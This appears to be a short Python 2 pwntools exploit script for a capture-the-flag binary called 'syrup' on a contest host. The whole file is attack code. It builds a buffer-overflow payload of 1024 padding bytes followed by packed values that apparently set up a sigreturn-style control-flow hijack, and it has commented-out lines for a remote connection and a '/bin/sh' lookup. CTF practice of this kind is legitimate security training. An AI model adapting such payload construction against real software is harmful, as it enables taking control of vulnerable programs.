from pwn import *

#elf = ELF('./syrup')
#p = remote('jh2i.com', 50036)
#binsh = p64(elf.search('/bin/sh').next())
#useless_shit = p64(elf.search('Nope').next())
payload = 'A'*1024+p64(0x6042)+p64(15)+p64(0x401000)
print payload
